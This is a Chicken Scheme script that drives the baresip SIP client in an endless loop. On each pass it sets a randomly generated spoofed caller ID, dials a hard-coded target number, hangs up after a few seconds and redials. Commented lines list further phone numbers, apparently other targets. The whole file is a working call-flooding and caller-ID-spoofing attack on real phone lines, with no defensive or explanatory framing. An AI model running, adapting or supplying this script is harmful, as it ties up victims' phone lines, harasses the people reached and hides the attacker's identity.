(use posix s)
   ; (718) 366-7829 good chinese
  ;18668209022
  ;18332925222
  ;18009169563
  ;18665378008
  ;1-888-595-8997
  ;18886515889
;18002594061
;18332946999
;1844850847
;9874545655
;1-800-290-0592
;18007120806
;17692084862
;18337687089
(define target "19086194513")
(define zz 15)
(define min-time 10)
(define hangup-after #t)
(process-run "killall" `("-9" "baresip"))
(sleep 2)
(define-values
  (inp outp pid)
  (process "baresip"))
(define outgoing-domain "@aol.com")
(define (write-response inp #!optional (a 0))
  (and-let* ((i  (read-line inp))
             (x  (not (eq? i #!eof)))
             (x  (not (> a 10))))
    (print i)
    (set! a (add1 a))
    (write-response inp a)))

(let ((c 1))
  (define (y)
    (let ((cfg
           (file-open
            "/tmp/.cid_baresip"
            (+ open/wronly open/creat))))
         (file-write cfg (sprintf "sip:1~A~A~A~A"
                                  (+ 200 (random 799))
                                  (+ 200 (random 799))
                                  (+ 1000 (random 8999))
                                  outgoing-domain)))
    (print "Call # " c)
    (write-line (sprintf "/dial ~A" target) outp)
    (sleep (random (+ min-time (random (- zz min-time)))))
    (when hangup-after
      (write-line (sprintf "/hangup call") outp)
      (write-response inp))
    (set! c (add1 c))
    (y))
  (y))



